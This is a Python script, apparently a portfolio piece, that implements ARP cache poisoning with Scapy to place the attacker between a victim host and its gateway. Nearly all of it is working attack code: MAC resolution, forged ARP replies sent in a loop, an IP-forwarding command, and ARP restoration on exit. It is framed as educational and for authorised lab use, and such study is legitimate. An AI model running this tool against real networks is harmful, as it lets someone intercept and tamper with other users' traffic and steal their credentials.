#!/usr/bin/env python3
"""
arp_spoof.py — ARP Spoofing Demo (Educational Use Only)
========================================================
Author  : r4r7r0x
Purpose : Demonstrate ARP cache poisoning using Scapy.
          Intended for controlled lab environments and portfolio documentation.

Technique : Gratuitous ARP reply injection (Man-in-the-Middle)
Layer     : Layer 2 / Data Link (ARP operates below IP)

LEGAL DISCLAIMER
----------------
This script is for educational and authorized testing purposes ONLY.
Running this tool on networks you do not own or have explicit permission
to test is illegal and unethical. The author assumes no responsibility
for misuse.

Requirements
------------
  pip install scapy
  Run as root / sudo (raw socket access required)

Usage
-----
  sudo python3 arp_spoof.py -t <target_ip> -g <gateway_ip> -i <interface>
  sudo python3 arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -i eth0

Stop with Ctrl+C — the script will automatically restore the ARP tables.
"""

import argparse
import sys
import time
import signal

try:
    from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
except ImportError:
    print("[!] Scapy not found. Install it with: pip install scapy")
    sys.exit(1)


# ──────────────────────────────────────────────
# ARP Utilities
# ──────────────────────────────────────────────

def get_mac(ip: str, iface: str) -> str:
    """
    Resolve the MAC address of a given IP using an ARP request.

    Constructs a broadcast Ethernet frame with an ARP WHO-HAS request,
    sends it on the wire, and returns the MAC from the first reply.

    Packet structure:
      Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=<ip>)
        └── Broadcast so all hosts on the segment receive it
        └── ARP op=1 (who-has / request)
    """
    arp_request = ARP(pdst=ip)
    broadcast   = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet      = broadcast / arp_request

    # srp() = send + receive at Layer 2
    answered, _ = srp(packet, iface=iface, timeout=2, verbose=False)

    if not answered:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)

    return answered[0][1].hwsrc


def build_arp_reply(target_ip: str, target_mac: str, spoof_ip: str) -> ARP:
    """
    Craft a forged ARP reply (op=2 / is-at).

    Tells <target_ip> that <spoof_ip> is at OUR MAC address (attacker MAC).
    This overwrites the target's ARP cache entry for spoof_ip.

    Frame layout:
      Ether(dst=<target_mac>) / ARP(op=2, pdst=<target_ip>, psrc=<spoof_ip>)
        └── hwsrc defaults to the attacker's interface MAC (the lie)
        └── hwdst set to target's real MAC so the frame is delivered
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,           # 2 = is-at (reply)
        pdst=target_ip, # Who we're poisoning
        hwdst=target_mac,
        psrc=spoof_ip,  # IP we're impersonating (gateway or victim)
        # hwsrc is NOT set → Scapy uses the real attacker MAC automatically
    )
    return packet


def restore_arp(target_ip: str, target_mac: str,
                source_ip: str, source_mac: str, iface: str, count: int = 4):
    """
    Send legitimate ARP replies to restore correct mappings in both victims.

    This is critical cleanup: without it, both hosts keep the poisoned cache
    entry and lose connectivity after the attack stops.
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(packet, iface=iface, count=count, verbose=False)


# ──────────────────────────────────────────────
# Core Attack Loop
# ──────────────────────────────────────────────

def arp_spoof(target_ip: str, gateway_ip: str, iface: str, interval: float = 2.0):
    """
    Main spoofing loop.

    Every <interval> seconds, sends two forged ARP replies:
      1. To the target  → "The gateway's IP is at MY MAC"
      2. To the gateway → "The target's IP is at MY MAC"

    Both ends update their ARP cache, placing the attacker in the middle.
    IP forwarding must be enabled at the OS level for traffic to flow through.
    """
    print(f"\n[*] Resolving MAC addresses...")
    target_mac  = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    print(f"    Target  {target_ip}  →  {target_mac}")
    print(f"    Gateway {gateway_ip}  →  {gateway_mac}")

    # Pre-build both forged packets (more efficient in the loop)
    poison_target  = build_arp_reply(target_ip,  target_mac,  gateway_ip)
    poison_gateway = build_arp_reply(gateway_ip, gateway_mac, target_ip)

    print(f"\n[*] Starting ARP poisoning (interval={interval}s). Press Ctrl+C to stop.\n")
    print(f"    NOTE: Enable IP forwarding to avoid DoS:")
    print(f"    sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'\n")

    packets_sent = 0

    # Graceful shutdown on Ctrl+C
    def handle_exit(sig, frame):
        print(f"\n\n[!] Interrupted. Sent {packets_sent} packet pairs.")
        print("[*] Restoring ARP tables...")
        restore_arp(target_ip,  target_mac,  gateway_ip, gateway_mac, iface)
        restore_arp(gateway_ip, gateway_mac, target_ip,  target_mac,  iface)
        print("[+] ARP tables restored. Exiting.\n")
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)

    while True:
        # Send both forged replies back-to-back
        sendp(poison_target,  iface=iface, verbose=False)
        sendp(poison_gateway, iface=iface, verbose=False)
        packets_sent += 1
        print(f"\r[>] Packets sent: {packets_sent}", end="", flush=True)
        time.sleep(interval)


# ──────────────────────────────────────────────
# CLI Entry Point
# ──────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Demo — Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -i eth0
  sudo python3 arp_spoof.py -t 10.10.14.5  -g 10.10.14.1  -i tun0 --interval 1
        """
    )
    parser.add_argument("-t", "--target",   required=True, help="Victim IP address")
    parser.add_argument("-g", "--gateway",  required=True, help="Gateway IP address")
    parser.add_argument("-i", "--iface",    required=True, help="Network interface (e.g. eth0)")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Seconds between ARP reply bursts (default: 2)")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    # Suppress Scapy's default verbose output
    conf.verb = 0

    print("=" * 55)
    print("  ARP Spoof Demo — github.com/r4r7r0x")
    print("  FOR AUTHORIZED TESTING / LAB USE ONLY")
    print("=" * 55)
    print(f"  Target   : {args.target}")
    print(f"  Gateway  : {args.gateway}")
    print(f"  Interface: {args.iface}")

    arp_spoof(args.target, args.gateway, args.iface, args.interval)